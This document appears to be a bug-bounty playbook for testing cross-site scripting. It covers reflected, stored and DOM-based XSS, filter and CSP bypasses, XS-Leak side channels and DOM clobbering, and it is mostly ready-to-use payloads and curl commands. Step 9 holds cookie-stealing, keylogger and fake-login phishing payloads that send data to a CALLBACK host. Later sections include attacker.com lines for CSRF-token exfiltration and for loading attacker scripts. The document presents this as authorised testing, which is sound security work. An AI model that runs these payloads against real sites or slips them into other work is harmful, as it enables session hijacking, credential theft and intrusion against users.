# Playbook: Cross-Site Scripting (XSS) Testing

## Purpose
Systematically detect and validate Reflected, Stored, and DOM-based XSS
vulnerabilities across all input vectors. Covers filter bypass, CSP evasion,
and impact demonstration.
Input: URL list, parameter list, or specific endpoint to test.

---

## Step 1 — Identify Injection Points

```bash
# From parameter_discovery output — reflected param candidates
cat all_params_final.txt > xss_candidates.txt

# From wayback triage — params that appeared in historical URLs
cat cat_interesting_params.txt >> xss_candidates.txt

# Quick reflection test with unique canary
CANARY="xssprobe$(date +%s)"
while read param; do
  url="https://TARGET/endpoint?${param}=${CANARY}"
  response=$(curl -sk "$url")
  echo "$response" | grep -q "$CANARY" && echo "[REFLECTED] $param → $url"
done < xss_candidates.txt > reflected_params.txt

echo "Reflected params: $(wc -l < reflected_params.txt)"
```

---

## Step 2 — Context Detection

For each reflected parameter, determine the reflection context:

```bash
CANARY="xssprobe12345"
URL="https://TARGET/endpoint?param=${CANARY}"
RESPONSE=$(curl -sk "$URL")

# Check reflection context
echo "$RESPONSE" | grep -B1 -A1 "$CANARY"

# Context types:
# 1. HTML body:     <div>xssprobe12345</div>
# 2. HTML attribute:<input value="xssprobe12345">
# 3. JavaScript:    var x = "xssprobe12345";
# 4. URL context:   <a href="xssprobe12345">
# 5. CSS context:   style="color: xssprobe12345"
# 6. Comment:       <!-- xssprobe12345 -->

# Automated context detection
python3 -c "
import re, sys
resp = open('/dev/stdin').read()
canary = '${CANARY}'
for m in re.finditer(re.escape(canary), resp):
    start = max(0, m.start()-50)
    end = min(len(resp), m.end()+50)
    context = resp[start:end]
    if '<script' in resp[max(0,m.start()-200):m.start()]:
        print(f'[JS CONTEXT] ...{context}...')
    elif re.search(r'<\w+[^>]*$', resp[start:m.start()]):
        print(f'[ATTRIBUTE CONTEXT] ...{context}...')
    elif '<!--' in resp[max(0,m.start()-50):m.start()]:
        print(f'[COMMENT CONTEXT] ...{context}...')
    else:
        print(f'[HTML BODY CONTEXT] ...{context}...')
" <<< "$RESPONSE"
```

---

## Step 3 — Payload Selection by Context

### HTML Body Context

```bash
# Basic payloads
PAYLOADS_HTML=(
  '<script>alert(1)</script>'
  '<img src=x onerror=alert(1)>'
  '<svg onload=alert(1)>'
  '<details open ontoggle=alert(1)>'
  '<body onload=alert(1)>'
  '<marquee onstart=alert(1)>'
  '<video><source onerror=alert(1)>'
  '<math><mtext><table><mglyph><svg><mtext><textarea><path id="</textarea><img onerror=alert(1) src=1>">'
)
```

### Attribute Context

```bash
# Break out of attribute
PAYLOADS_ATTR=(
  '" onmouseover="alert(1)'
  "' onmouseover='alert(1)"
  '" onfocus="alert(1)" autofocus="'
  '" onload="alert(1)'
  '"><script>alert(1)</script>'
  "' onfocus='alert(1)' autofocus='"
  '" style="animation-name:x" onanimationstart="alert(1)'
)
```

### JavaScript Context

```bash
# Break out of JS string
PAYLOADS_JS=(
  "';alert(1);//"
  '";alert(1);//'
  '</script><script>alert(1)</script>'
  "\\';alert(1);//"
  '-alert(1)-'
  '${alert(1)}'          # template literals
  '`-alert(1)-`'
)
```

### URL/href Context

```bash
PAYLOADS_URL=(
  'javascript:alert(1)'
  'data:text/html,<script>alert(1)</script>'
  'javascript:alert(document.domain)'
  'jaVasCriPt:alert(1)'  # case variation
  'java%0ascript:alert(1)'  # newline bypass
)
```

---

## Step 4 — Execute Payloads

```bash
TARGET_URL="https://TARGET/endpoint"
PARAM="search"

# URL-encode and send each payload
for payload in "${PAYLOADS_HTML[@]}"; do
  encoded=$(python3 -c "import urllib.parse; print(urllib.parse.quote('$payload'))")
  response=$(curl -sk "${TARGET_URL}?${PARAM}=${encoded}")

  # Check if payload survived encoding/filtering
  if echo "$response" | grep -q "alert(1)"; then
    echo "[POSSIBLE XSS] Payload reflected: $payload"
    echo "  URL: ${TARGET_URL}?${PARAM}=${encoded}"
  fi
done

# POST-based reflection test
for payload in "${PAYLOADS_HTML[@]}"; do
  response=$(curl -sk -X POST "${TARGET_URL}" \
    -d "${PARAM}=$(python3 -c "import urllib.parse; print(urllib.parse.quote('$payload'))")")

  if echo "$response" | grep -q "alert(1)"; then
    echo "[POSSIBLE XSS] POST reflected: $payload"
  fi
done
```

---

## Step 5 — Filter Bypass Techniques

If basic payloads are blocked, attempt bypasses:

```bash
# Case variation
'<ScRiPt>alert(1)</ScRiPt>'
'<IMG SRC=x OnErRoR=alert(1)>'

# Double encoding
'%253Cscript%253Ealert(1)%253C%252Fscript%253E'

# HTML entity encoding
'&#60;script&#62;alert(1)&#60;/script&#62;'
'<img src=x onerror=&#97;&#108;&#101;&#114;&#116;(1)>'

# Null byte injection
'<scr%00ipt>alert(1)</scr%00ipt>'

# Tag name obfuscation
'<scr<script>ipt>alert(1)</scr</script>ipt>'

# Event handler alternatives (if common ones are blocked)
'<svg/onload=alert(1)>'
'<input onfocus=alert(1) autofocus>'
'<details/open/ontoggle=alert(1)>'
'<body/onpageshow=alert(1)>'
'<textarea onfocus=alert(1) autofocus>'
'<select onfocus=alert(1) autofocus>'

# Without parentheses
'<img src=x onerror=alert`1`>'
'<svg onload=alert&lpar;1&rpar;>'
'<img src=x onerror=window.onerror=alert;throw+1>'

# Without alert keyword
'<img src=x onerror=confirm(1)>'
'<img src=x onerror=prompt(1)>'
'<img src=x onerror=eval(atob("YWxlcnQoMSk="))>'
'<img src=x onerror=top["al"+"ert"](1)>'
'<img src=x onerror=self["alert"](1)>'

# SVG-based (often bypasses filters)
'<svg><animate onbegin=alert(1) attributeName=x dur=1s>'
'<svg><set onbegin=alert(1) attributeName=x to=1>'

# Polyglot (works in multiple contexts)
'jaVasCript:/*-/*`/*\`/*\'/*"/**/(/* */oNcliCk=alert() )//%0D%0A%0d%0a//</stYle/</titLe/</teXtarEa/</scRipt/--!>\x3csVg/<sVg/oNloAd=alert()//>\x3e'
```

---

## Step 6 — DOM-Based XSS Testing

```bash
# Download and analyze JavaScript files for DOM sinks
# Common sinks:
#   document.write()
#   innerHTML
#   outerHTML
#   eval()
#   setTimeout()/setInterval() with string arg
#   location.href / location.assign() / location.replace()
#   element.src / element.href
#   jQuery .html() / .append() / .prepend()
#   $.globalEval()

# Grep for sinks in JS files
grep -rhoiE "(document\.write|\.innerHTML|\.outerHTML|eval\(|setTimeout\(|setInterval\(|location\.(href|assign|replace)|\.html\(|\.append\(|\.prepend\(|\\\$\.globalEval)" \
  js_files/ | sort | uniq -c | sort -rn

# Grep for sources (user-controllable input)
grep -rhoiE "(location\.(hash|search|href|pathname)|document\.(URL|referrer|cookie)|window\.name|postMessage|URLSearchParams)" \
  js_files/ | sort | uniq -c | sort -rn

# Source → Sink mapping
# If a source flows into a sink without sanitization → DOM XSS
# Example:
#   var q = location.hash.substring(1);
#   document.getElementById("output").innerHTML = q;  // DOM XSS!

# Fragment-based DOM XSS test
curl -sk "https://TARGET/page#<img src=x onerror=alert(1)>"
# (Must test in browser — fragments are not sent to server)

# URL parameter DOM XSS
# Open in browser:
# https://TARGET/page?param=<img src=x onerror=alert(1)>
# Check if JS processes the param client-side
```

---

## Step 7 — Stored XSS Testing

```bash
# Identify storage points:
# - User profile fields (name, bio, avatar URL)
# - Comments / posts / reviews
# - File upload names
# - Contact forms / support tickets
# - Shared documents / notes
# - Chat messages
# - Custom field values (CRM, CMS)

# Inject stored payload
STORED_PAYLOAD='"><img src=x onerror=alert(document.domain)>'

# Example: comment form
curl -sk -X POST "https://TARGET/api/comment" \
  -H "Content-Type: application/json" \
  -H "Cookie: session=AUTHENTICATED_COOKIE" \
  -d "{\"comment\": \"${STORED_PAYLOAD}\"}"

# Then visit the page where the comment is rendered
curl -sk "https://TARGET/comments" | grep "onerror"

# Profile field injection
curl -sk -X PUT "https://TARGET/api/profile" \
  -H "Content-Type: application/json" \
  -H "Cookie: session=AUTHENTICATED_COOKIE" \
  -d "{\"display_name\": \"${STORED_PAYLOAD}\"}"

# File name injection
echo "test" > '"><img src=x onerror=alert(1)>.txt'
curl -sk -X POST "https://TARGET/upload" \
  -H "Cookie: session=AUTHENTICATED_COOKIE" \
  -F "file=@\"><img src=x onerror=alert(1)>.txt"
```

---

## Step 8 — CSP Bypass Techniques

```bash
# First, check the CSP policy
curl -sk -I "https://TARGET/" | grep -i "content-security-policy"

# Common CSP bypasses:

# 1. If script-src includes 'unsafe-inline'
#    → standard XSS payloads work directly

# 2. If script-src includes 'unsafe-eval'
#    → eval-based payloads work
#    <img src=x onerror="eval('alert(1)')">

# 3. If script-src allows a CDN (cdnjs, jsdelivr, etc.)
#    → load attacker-controlled script from allowed CDN
#    <script src="https://cdn.jsdelivr.net/gh/attacker/repo/evil.js"></script>

# 4. If script-src allows 'self' and file upload exists
#    → upload JS file, reference it
#    <script src="/uploads/evil.js"></script>

# 5. JSONP endpoints on whitelisted domains
#    <script src="https://whitelisted.com/api?callback=alert(1)//"></script>

# 6. Base tag injection (if base-uri not restricted)
#    <base href="https://attacker.com/">
#    (all relative script paths now load from attacker)

# 7. Nonce reuse / predictable nonce
#    If nonce is static or predictable:
#    <script nonce="KNOWN_NONCE">alert(1)</script>

# 8. If only default-src is set (no script-src)
#    → object/embed might work:
#    <object data="data:text/html,<script>alert(1)</script>">

# 9. Meta tag redirect (if no navigate-to)
#    <meta http-equiv="refresh" content="0;url=https://attacker.com/">

# Report CSP issues
python3 -c "
csp = '''$(curl -sk -I "https://TARGET/" | grep -i content-security-policy | sed 's/.*: //')'''
print('CSP Analysis:')
if 'unsafe-inline' in csp: print('  [WEAK] unsafe-inline allowed')
if 'unsafe-eval' in csp: print('  [WEAK] unsafe-eval allowed')
if '*' in csp: print('  [WEAK] wildcard source')
if 'data:' in csp: print('  [WEAK] data: URI allowed')
if 'http:' in csp: print('  [WEAK] http: allowed (mixed content)')
if 'nonce-' not in csp and 'hash-' not in csp:
    print('  [WEAK] no nonce or hash-based restriction')
"
```

---

## Step 9 — Impact Demonstration

Once XSS is confirmed, demonstrate real impact (do not exfiltrate real data):

```bash
# Session hijacking PoC (send to your own server)
PAYLOAD='<script>new Image().src="https://CALLBACK/steal?c="+document.cookie</script>'

# Keylogger PoC
PAYLOAD='<script>document.onkeypress=function(e){new Image().src="https://CALLBACK/k?k="+e.key;}</script>'

# Phishing PoC (fake login form)
PAYLOAD='<script>document.body.innerHTML="<h1>Session Expired</h1><form action=https://CALLBACK/phish method=POST><input name=user placeholder=Username><input name=pass type=password placeholder=Password><button>Login</button></form>";</script>'

# Page defacement PoC (harmless)
PAYLOAD='<script>document.title="XSS PoC by Tester";document.body.innerHTML="<h1>XSS Vulnerability Confirmed</h1><p>This is a proof of concept.</p>";</script>'

# For stored XSS — use a benign, visible payload:
PAYLOAD='<img src=x onerror="this.src=\'https://placehold.co/200x50/red/white?text=XSS+PoC\';this.onerror=null">'
```

---

## Output

```
ASSET         : https://target.com/search?q=
CONTEXT       : HTML body — reflected in <div class="results">...</div>
TYPE          : Reflected XSS
PAYLOAD       : <img src=x onerror=alert(document.domain)>
FILTER BYPASS : None required
CSP STATUS    : No CSP header present
SEVERITY      : HIGH (P2)
IMPACT        : Session hijacking, cookie theft, phishing
                Cookie flags: HttpOnly=NO → cookie accessible via JS
EVIDENCE      : [URL with payload + screenshot of alert box]
NEXT STEPS    :
  1. Test stored XSS on same parameter
  2. Check if admin panel renders this data (escalate to P1)
  3. Load 03_reporting/report_writer.md → write report
```

---

## Tools Reference

```bash
# XSS-specific tools
pip install xsstrike
go install github.com/hahwul/dalfox/v2@latest
go install github.com/KathanP19/Gxss@latest

# Usage
# XSStrike — smart XSS scanner
python3 xsstrike.py -u "https://TARGET/search?q=test" --crawl

# Dalfox — parameter-based XSS scanner
dalfox url "https://TARGET/search?q=test" --blind "https://CALLBACK"
cat urls_reflected.txt | dalfox pipe --blind "https://CALLBACK"

# Gxss — reflection checker (fast, bulk)
cat urls_all.txt | Gxss -p "xssprobe" -o reflected.txt

# Burp Suite extensions:
# - Reflected Parameters
# - XSS Validator
# - Backslash Powered Scanner
```

---

## Quick Reference — Payload Cheat Sheet

```
HTML:       <img src=x onerror=alert(1)>
Attribute:  " onfocus="alert(1)" autofocus="
JS string:  '-alert(1)-'
JS tpl lit: ${alert(1)}
URL/href:   javascript:alert(1)
SVG:        <svg/onload=alert(1)>
No parens:  <img src=x onerror=alert`1`>
No alert:   <img src=x onerror=confirm(1)>
Polyglot:   '"><img src=x onerror=alert(1)>
Stored:     "><img src=x onerror=alert(document.domain)>
DOM:        #<img src=x onerror=alert(1)>
```

---

## Step 10 — XS-Leak Attacks (Cross-Site Information Leaks)

XS-Leaks exploit browser side-channels to infer cross-origin state without
requiring traditional XSS execution. These are especially relevant for bug
bounty because they bypass SOP and CSP entirely — the attacker page never
injects code into the target; it observes the target's behavior from a
separate origin.

### 10.1 — Cross-Origin Redirect Leak (PortSwigger Top 10 2025, #8 — Salvatore Abello)

Chrome prioritizes connections in its socket pool differently for redirects
vs direct responses. An attacker page can use this timing/prioritization
oracle to detect whether a cross-origin request resulted in a redirect.

```
Attack Flow:
1. Attacker page opens/fetches a cross-origin URL (e.g., /profile)
2. If the user is logged in  -> 200 OK (direct response)
3. If the user is logged out -> 302 redirect to /login
4. The connection-pool prioritization differs between these two cases
5. Attacker measures the difference to determine auth state
```

```javascript
// Conceptual PoC: redirect detection via connection pool oracle
// Open multiple connections to exhaust the per-origin pool,
// then observe whether the target request is queued or prioritized.

async function detectRedirect(targetUrl) {
  const POOL_SIZE = 6; // Chrome per-origin connection limit
  const sockets = [];

  // Step 1: Saturate the connection pool with slow requests
  for (let i = 0; i < POOL_SIZE; i++) {
    sockets.push(fetch('https://target.com/slow-endpoint', {
      mode: 'no-cors',
      credentials: 'include'
    }));
  }

  // Step 2: Time the target request
  const start = performance.now();
  await fetch(targetUrl, { mode: 'no-cors', credentials: 'include' });
  const elapsed = performance.now() - start;

  // Step 3: Redirects vs direct responses exhibit different timing
  // due to connection pool prioritization behavior
  return elapsed;
}
```

**Practical impact:**
- Detect whether a victim is logged in or logged out on a target site
- Determine if a user has access to a specific resource behind auth
- Distinguish between admin and regular user roles
- Does not require any XSS vulnerability on the target

### 10.2 — Cross-Site ETag Length Leak (PortSwigger Top 10 2025, #6 — Takeshi Kaneko)

ETag headers often encode or correlate with response body size. By forcing
the browser to make conditional requests (If-None-Match), an attacker can
infer cross-origin response sizes without reading the response body.

```
Attack Flow:
1. Attacker page triggers a cross-origin fetch with credentials
2. Browser caches the response and its ETag
3. Subsequent conditional requests (If-None-Match) reveal whether
   the ETag changed, which correlates with response size changes
4. Different users / states produce different response sizes
5. Attacker infers state from the size signal
```

**Why this is hard to patch:**
- ETag is a standard HTTP caching mechanism — disabling it breaks performance
- The leak works through normal browser caching behavior
- No CSP or CORS policy prevents the cache from storing ETags
- Resistant to common mitigations like SameSite cookies (if Lax)

**Detection targets:**
- Endpoints that return different-sized responses based on user state
- Search results pages (different result counts leak query matches)
- Profile pages (presence/absence of admin panels changes size)
- API endpoints with variable-length JSON responses

### 10.3 — General XS-Leak Methodology

When testing for XS-Leaks, systematically check each browser side-channel:

#### Frame Counting (window.length)

```javascript
// Detect how many iframes a cross-origin page renders
// Different states (logged in vs out) often show different frame counts
const w = window.open('https://target.com/dashboard', '_blank');
setTimeout(() => {
  console.log('Frame count:', w.length);
  // Logged in: 3 frames (dashboard widgets)
  // Logged out: 0 frames (login page)
  w.close();
}, 3000);
```

#### Timing Attacks

```javascript
// performance.now() timing
async function timeRequest(url) {
  const start = performance.now();
  await fetch(url, { mode: 'no-cors', credentials: 'include' });
  return performance.now() - start;
}

// SharedArrayBuffer high-resolution timer (if available)
const sab = new SharedArrayBuffer(4);
const timer = new Int32Array(sab);
const worker = new Worker('timer-worker.js');
worker.postMessage(sab);
// Worker increments timer[0] in a tight loop
// Read timer[0] before and after fetch for sub-ms precision
```

#### Error Events (onerror / onload)

```javascript
// Determine if a cross-origin resource exists or requires auth
// based on whether it fires onload or onerror
function probeResource(url) {
  return new Promise((resolve) => {
    const img = new Image();
    img.onload = () => resolve('accessible');
    img.onerror = () => resolve('blocked_or_missing');
    img.src = url;
  });
}

// Script tag variant (detects valid JS vs error page)
function probeScript(url) {
  return new Promise((resolve) => {
    const s = document.createElement('script');
    s.onload = () => resolve('valid_js');
    s.onerror = () => resolve('error');
    s.src = url;
    document.head.appendChild(s);
  });
}
```

#### Cache Probing

```javascript
// Check if a resource is already in browser cache
// (indicates the user visited that page recently)
async function isCached(url) {
  const start = performance.now();
  await fetch(url, { mode: 'no-cors', credentials: 'include', cache: 'force-cache' });
  const elapsed = performance.now() - start;
  // Cached responses return significantly faster
  return elapsed < 5; // threshold in ms, calibrate per target
}
```

#### postMessage Leaks

```javascript
// Listen for cross-origin postMessage that leaks state
window.addEventListener('message', (event) => {
  // Some apps broadcast state via postMessage without origin checks
  console.log('Leaked message from', event.origin, ':', event.data);
});

// Open target in iframe or popup to trigger postMessage broadcasts
const frame = document.createElement('iframe');
frame.src = 'https://target.com/page-that-broadcasts';
document.body.appendChild(frame);
```

#### Navigation Timing API

```javascript
// Use PerformanceNavigationTiming to measure cross-origin timings
const observer = new PerformanceObserver((list) => {
  for (const entry of list.getEntries()) {
    // redirectCount reveals if a redirect occurred
    // duration reveals response time differences
    console.log(entry.name, entry.duration, entry.redirectCount);
  }
});
observer.observe({ type: 'navigation', buffered: true });
```

#### Connection Pool Oracle

```
The browser limits concurrent connections per origin (typically 6 for HTTP/1.1).
By saturating the pool and measuring queue times for the Nth+1 request,
attackers can infer whether prior requests completed quickly (cached/small)
or slowly (large/dynamic), revealing cross-origin state.
```

### 10.4 — XS-Leak to Account Takeover Chains

#### Detecting Admin Status Cross-Origin

```
Chain:
1. XS-Leak detects that /admin returns 200 (not 403) -> victim is admin
2. Attacker targets admin-specific endpoints for CSRF or further leaks
3. Combine with CSRF to perform admin actions on behalf of victim
```

#### Leaking CSRF Tokens Through Timing

```
Chain:
1. Embed cross-origin page containing CSRF token in an iframe
2. Use XS-Leak timing to measure response size byte-by-byte
3. Binary search: inject CSS selectors or query parameters that change
   response size based on token prefix
4. Reconstruct full CSRF token character by character
5. Use stolen token to submit forged requests
```

```javascript
// CSS-based token extraction (if HTML injection exists without JS)
// Inject: <style>input[name=csrf][value^="a"]{background:url(https://attacker.com/leak?prefix=a)}</style>
// Repeat for each character position with XS-Leak timing as oracle
```

#### User Fingerprinting via Cached Resources

```
Chain:
1. Probe cache for user-specific resources:
   - /api/notifications (logged-in users have it cached)
   - /avatar/USER_ID.png (reveals which accounts victim follows)
   - /settings/theme.css (reveals premium vs free user)
2. Build a profile of the victim's identity and access level
3. Chain with targeted phishing or privilege escalation
```

### 10.5 — XS-Leak Testing Checklist

```
[ ] Identify endpoints with state-dependent behavior (auth, roles, search)
[ ] Test frame counting on target pages (window.length oracle)
[ ] Measure timing differences for authenticated vs unauthenticated requests
[ ] Check onerror/onload behavior on images, scripts, stylesheets
[ ] Probe cache for user-specific or state-specific resources
[ ] Listen for postMessage broadcasts from target origin
[ ] Test connection pool saturation for redirect detection
[ ] Check ETag-based size leaks on variable-content endpoints
[ ] Map any leaks to concrete impact (auth state, admin detection, token theft)
[ ] Verify SameSite cookie policy (None/Lax/Strict) — affects exploitability
```

---

## Step 11 — DOM Clobbering Attacks

DOM Clobbering exploits the browser's behavior of creating global JavaScript
variables from HTML elements with `id` or `name` attributes. This allows
attackers to overwrite global variables and document properties using only
HTML injection — no JavaScript execution required. This bypasses CSP and
other script-blocking defenses.

### 11.1 — How DOM Clobbering Works

```
The browser automatically creates properties on `document` and `window` for
elements with `id` attributes. If application code references a global
variable without declaring it, an attacker can inject HTML that "clobbers"
that variable with a DOM element reference.

Example: if code does `if (window.config) { ... }` and config is not
explicitly declared, injecting <div id="config"> makes window.config point
to that div element, which is truthy.
```

### 11.2 — Basic Clobbering Techniques

```html
<!-- Clobber a global variable -->
<img id="isAdmin">
<!-- Now window.isAdmin is the img element (truthy) -->

<!-- Clobber document properties -->
<img name="cookie">
<!-- Now document.cookie returns the img element instead of cookies -->

<!-- Clobber with a specific value via toString() -->
<a id="config" href="https://attacker.com/evil.js">
<!-- window.config.toString() returns "https://attacker.com/evil.js" -->
<!-- If code does: scriptSrc = config || defaultSrc; -> loads attacker script -->

<!-- Nested clobbering via form + named elements -->
<form id="config"><input name="url" value="attacker-value"></form>
<!-- window.config.url returns the input element -->
<!-- window.config.url.value returns "attacker-value" -->

<!-- Clobber with HTMLCollection for array-like behavior -->
<a id="urls">first</a>
<a id="urls">second</a>
<!-- document.getElementsByName or repeated ids create collections -->
```

### 11.3 — Advanced Clobbering: Deep Property Access

```html
<!-- Two-level clobbering: obj.property -->
<form id="config"><output name="apiUrl">https://attacker.com</output></form>
<!-- config.apiUrl.value = "https://attacker.com" -->

<!-- Three-level clobbering: obj.a.b (using iframe srcdoc) -->
<iframe name="config" srcdoc="
  <a id='endpoint' href='https://attacker.com/api'>
"></iframe>
<!-- window.config.endpoint.href = "https://attacker.com/api" -->
```

### 11.4 — Identifying Clobberable Code Patterns

```bash
# Search JS files for patterns vulnerable to DOM clobbering

# Global variable references without declaration
grep -rhoiE "window\.\w+" js_files/ | sort -u > global_refs.txt

# Code that uses OR with a global (default value pattern)
grep -rn "window\.\w\+ || " js_files/
grep -rn "typeof \w\+ !== .undefined." js_files/

# Code that reads element properties as config
grep -rn "\.getAttribute\|\.href\|\.src\|\.action\|\.value" js_files/ | \
  grep -v "getElementById\|querySelector"

# Direct document property access
grep -rn "document\.\(title\|referrer\|baseURI\|forms\)" js_files/
```

### 11.5 — Chaining DOM Clobbering with Other Vulnerabilities

```
DOM Clobbering + Prototype Pollution:
1. Clobber a global config object via HTML injection
2. The clobbered object's prototype chain includes Object.prototype
3. If prototype pollution exists, the clobbered reference can trigger
   the polluted property, escalating to code execution

DOM Clobbering + Script Gadgets:
1. Find a JS library that reads from a global or document property
2. Clobber that property with a controlled value
3. The library processes the clobbered value unsafely (e.g., innerHTML,
   eval, script src assignment)
4. This turns HTML injection into arbitrary JS execution

DOM Clobbering + Relative URL Resolution:
1. Clobber document.baseURI or inject <base> tag
2. All relative URLs in the page now resolve against attacker origin
3. Script tags with relative src load attacker-controlled JS
```

### 11.6 — Known Gadgets in Popular Libraries

```
DOMPurify (pre-2.0.17):
  - Clobber document.createElement to bypass sanitization

jQuery (various):
  - Clobber elements referenced by $.fn or jQuery plugins
  - globalEval gadget if config object is clobberable

Google Closure Library:
  - goog.getObjectByName reads from window -> clobberable

Webpack jsonp:
  - webpackJsonp or webpackChunk array can be clobbered if
    the variable is not explicitly initialized
```

### 11.7 — DOM Clobbering Testing Steps

```
[ ] Identify HTML injection points that survive sanitization (no JS needed)
[ ] Map all global variable references in the application's JS
[ ] Check which globals are not explicitly declared (let/const/var)
[ ] Test if id/name attributes survive the sanitizer (DOMPurify allows them)
[ ] Inject clobbering payloads for identified globals
[ ] Check if clobbered values flow into dangerous sinks
[ ] Test library-specific gadgets (DOMPurify, jQuery, Closure, etc.)
[ ] Attempt to chain with prototype pollution if present
[ ] Verify CSP bypass: DOM clobbering requires zero JS execution for setup
```

### 11.8 — DOM Clobbering Payloads

```html
<!-- Boolean clobber (make a check truthy) -->
<img id="DEBUG">
<img id="isAdmin">
<img id="skipValidation">

<!-- String clobber via anchor href -->
<a id="apiEndpoint" href="https://attacker.com/api">
<a id="cdnBase" href="https://attacker.com/cdn/">
<a id="redirectUrl" href="https://attacker.com/">

<!-- Object clobber via form -->
<form id="settings"><input name="debug" value="true"></form>
<form id="config"><input name="apiKey" value="attacker-key"></form>

<!-- Clobber document.getElementById -->
<!-- (works in older browsers / specific scenarios) -->
<img name="getElementById">

<!-- Clobber with specific .toString() -->
<a id="templateUrl" href="https://attacker.com/template.html">
<!-- If code does: fetch(templateUrl) -> fetches attacker template -->
```

---

## Output (XS-Leak / DOM Clobbering Findings)

```
ASSET         : https://target.com/dashboard
TYPE          : XS-Leak — Cross-Origin Auth State Detection
TECHNIQUE     : Frame counting (window.length oracle)
OBSERVATION   : Logged-in dashboard renders 4 iframes, login page renders 0
IMPACT        : Attacker can determine if victim is authenticated on target
CSP RELEVANT  : No — XS-Leaks bypass CSP entirely
SEVERITY      : MEDIUM (P3) — information disclosure, chainable
CHAIN         : Combine with CSRF on admin endpoint for privilege escalation
EVIDENCE      : [PoC HTML page + timing measurements]
NEXT STEPS    :
  1. Check if admin-specific pages have distinct frame counts (escalate impact)
  2. Test connection pool oracle for redirect-based state detection
  3. Look for CSRF endpoints to chain with auth state detection
  4. Load 03_reporting/report_writer.md -> write report

ASSET         : https://target.com/search?q=
TYPE          : DOM Clobbering -> XSS via Script Gadget
INJECTION     : <a id="config" href="https://attacker.com/evil.js">
GADGET        : App reads window.config without declaration, passes to script loader
IMPACT        : Arbitrary JavaScript execution bypassing CSP (no inline script needed)
SEVERITY      : HIGH (P2) — full XSS impact via HTML-only injection
EVIDENCE      : [Injected HTML + screenshot of attacker JS execution]
NEXT STEPS    :
  1. Demonstrate cookie theft / session hijack via loaded script
  2. Check other clobberable globals for additional gadgets
  3. Load 03_reporting/report_writer.md -> write report
```
